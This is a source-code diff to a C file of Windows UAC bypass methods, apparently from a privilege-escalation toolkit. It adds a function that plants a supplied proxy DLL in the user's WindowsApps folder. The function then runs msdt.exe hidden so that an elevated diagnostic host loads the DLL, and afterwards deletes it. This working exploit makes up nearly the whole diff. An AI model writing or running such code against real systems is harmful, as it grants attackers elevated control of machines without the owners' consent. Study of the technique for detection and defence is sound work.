@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2021
+*  (C) COPYRIGHT AUTHORS, 2015 - 2022
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.58
+*  VERSION:     3.59
 *
-*  DATE:        01 Dec 2021
+*  DATE:        02 Feb 2022
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1038,6 +1038,99 @@ NTSTATUS ucmJunctionMethod(
         }
 
     }
+
+#ifdef _DEBUG
+    supSetGlobalCompletionEvent();
+#endif
+
+    return MethodResult;
+}
+
+/*
+* ucmMsdtMethod
+*
+* Purpose:
+*
+* Bypass UAC by dll hijack of sdiagnhost.
+* https://blog.sevagas.com/?MSDT-DLL-Hijack-UAC-bypass
+*
+*/
+NTSTATUS ucmMsdtMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    BOOLEAN bCleanupNeeded = FALSE;
+    UINT i;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+#ifndef _WIN64
+    NTSTATUS ntStatus = STATUS_ACCESS_DENIED;
+#endif
+    WCHAR szPath[MAX_PATH * 2];
+    WCHAR szApp[MAX_PATH + 1];
+    WCHAR szParams[MAX_PATH * 2];
+
+#ifndef _WIN64
+    if (g_ctx->IsWow64) {
+        ntStatus = supEnableDisableWow64Redirection(TRUE);
+        if (!NT_SUCCESS(ntStatus))
+            return ntStatus;
+    }
+#endif
+
+    do {
+
+        RtlSecureZeroMemory(&szPath, sizeof(szPath));
+        if (!SHGetSpecialFolderPath(NULL, (LPWSTR)&szPath, CSIDL_LOCAL_APPDATA, FALSE))
+            break;
+
+        supConcatenatePaths(szPath, TEXT("Microsoft\\WindowsApps"), MAX_PATH);
+        supConcatenatePaths(szPath, BLUETOOTHDIAGNOSTICUTIL_DLL, MAX_PATH);
+
+        if (!supWriteBufferToFile(szPath, ProxyDll, ProxyDllSize))
+            break;
+
+        bCleanupNeeded = TRUE;
+
+        _strcpy(szApp, g_ctx->szSystemRoot);
+        supConcatenatePaths(szApp, SYSWOW64_DIR, MAX_PATH);
+        supConcatenatePaths(szApp, MSDT_EXE, MAX_PATH);
+
+        _strcpy(szParams, TEXT("-path "));
+        _strcat(szParams, g_ctx->szSystemRoot);
+        _strcat(szParams, TEXT("diagnostics\\index\\BluetoothDiagnostic.xml -skip yes"));
+
+        if (supRunProcess2(szApp,
+            szParams,
+            NULL,
+            SW_HIDE,
+            10000))
+        {
+            MethodResult = STATUS_SUCCESS;
+        }
+
+    } while (FALSE);
+
+
+    if (bCleanupNeeded) {
+        i = 5;
+        do {
+
+            if (DeleteFile(szPath))
+                break;
+
+            Sleep(1000);
+            i--;
+        } while (i);
+
+    }
+
+
+#ifndef _WIN64
+    if (g_ctx->IsWow64) {
+        supEnableDisableWow64Redirection(FALSE);
+    }
+#endif
 
 #ifdef _DEBUG
     supSetGlobalCompletionEvent();
